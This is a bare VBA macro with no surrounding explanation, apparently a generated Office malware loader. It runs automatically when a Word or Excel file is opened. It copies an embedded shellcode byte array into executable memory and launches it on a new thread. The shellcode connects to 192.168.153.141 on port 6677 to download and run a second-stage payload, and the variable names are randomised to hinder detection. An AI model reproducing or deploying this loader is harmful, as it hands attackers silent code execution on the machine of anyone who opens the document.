#If Vba7 Then
	Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal Ttegtai As Long, ByVal Fjqdgqih As Long, ByVal Rzfhudcn As LongPtr, Vkyy As Long, ByVal Gjhukc As Long, Lvnbdyubw As Long) As LongPtr
	Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal Chyvlpnrb As Long, ByVal Crjhsxqv As Long, ByVal Raz As Long, ByVal Aiifrxhlw As Long) As LongPtr
	Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal Gazizudv As LongPtr, ByRef Tuskpwgb As Any, ByVal Pnuvo As Long) As LongPtr
#Else
	Private Declare Function CreateThread Lib "kernel32" (ByVal Ttegtai As Long, ByVal Fjqdgqih As Long, ByVal Rzfhudcn As Long, Vkyy As Long, ByVal Gjhukc As Long, Lvnbdyubw As Long) As Long
	Private Declare Function VirtualAlloc Lib "kernel32" (ByVal Chyvlpnrb As Long, ByVal Crjhsxqv As Long, ByVal Raz As Long, ByVal Aiifrxhlw As Long) As Long
	Private Declare Function RtlMoveMemory Lib "kernel32" (ByVal Gazizudv As Long, ByRef Tuskpwgb As Any, ByVal Pnuvo As Long) As Long
#EndIf

Sub Auto_Open()
	Dim Ihca As Long, Mmqun As Variant, Pserppvyv As Long
#If Vba7 Then
	Dim  Obws As LongPtr, Kdge As LongPtr
#Else
	Dim  Obws As Long, Kdge As Long
#EndIf
	Mmqun = Array(72,131,228,240,232,204,0,0,0,65,81,65,80,82,72,49,210,81,86,101,72,139,82,96,72,139,82,24,72,139,82,32,77,49,201,72,139,114,80,72,15,183,74,74,72,49,192,172,60,97,124,2,44,32,65,193,201,13,65,1,193,226,237,82,72,139,82,32,65,81,139,66,60,72,1,208,102,129,120,24, _
11,2,15,133,114,0,0,0,139,128,136,0,0,0,72,133,192,116,103,72,1,208,68,139,64,32,73,1,208,80,139,72,24,227,86,77,49,201,72,255,201,65,139,52,136,72,1,214,72,49,192,172,65,193,201,13,65,1,193,56,224,117,241,76,3,76,36,8,69,57,209,117,216,88,68,139,64,36,73,1, _
208,102,65,139,12,72,68,139,64,28,73,1,208,65,139,4,136,65,88,72,1,208,65,88,94,89,90,65,88,65,89,65,90,72,131,236,32,65,82,255,224,88,65,89,90,72,139,18,233,75,255,255,255,93,73,190,119,115,50,95,51,50,0,0,65,86,73,137,230,72,129,236,160,1,0,0,73,137,229,73, _
188,2,0,26,21,192,168,153,141,65,84,73,137,228,76,137,241,65,186,76,119,38,7,255,213,76,137,234,104,1,1,0,0,89,65,186,41,128,107,0,255,213,106,10,65,94,80,80,77,49,201,77,49,192,72,255,192,72,137,194,72,255,192,72,137,193,65,186,234,15,223,224,255,213,72,137,199,106,16,65, _
88,76,137,226,72,137,249,65,186,153,165,116,97,255,213,133,192,116,10,73,255,206,117,229,232,147,0,0,0,72,131,236,16,72,137,226,77,49,201,106,4,65,88,72,137,249,65,186,2,217,200,95,255,213,131,248,0,126,85,72,131,196,32,94,137,246,106,64,65,89,104,0,16,0,0,65,88,72,137,242, _
72,49,201,65,186,88,164,83,229,255,213,72,137,195,73,137,199,77,49,201,73,137,240,72,137,218,72,137,249,65,186,2,217,200,95,255,213,131,248,0,125,40,88,65,87,89,104,0,64,0,0,65,88,106,0,90,65,186,11,47,15,48,255,213,87,89,65,186,117,110,77,97,255,213,73,255,206,233,60,255, _
255,255,72,1,195,72,41,198,72,133,246,117,180,65,255,231,88,106,0,89,73,199,194,240,181,162,86,255,213)

	Obws = VirtualAlloc(0, UBound(Mmqun), &H1000, &H40)
	For Pserppvyv = LBound(Mmqun) To UBound(Mmqun)
		Ihca = Mmqun(Pserppvyv)
		Kdge = RtlMoveMemory(Obws + Pserppvyv, Ihca, 1)
	Next Pserppvyv
	Kdge = CreateThread(0, 0, Obws, 0, 0, 0)
End Sub
Sub AutoOpen()
	Auto_Open
End Sub
Sub Workbook_Open()
	Auto_Open
End Sub

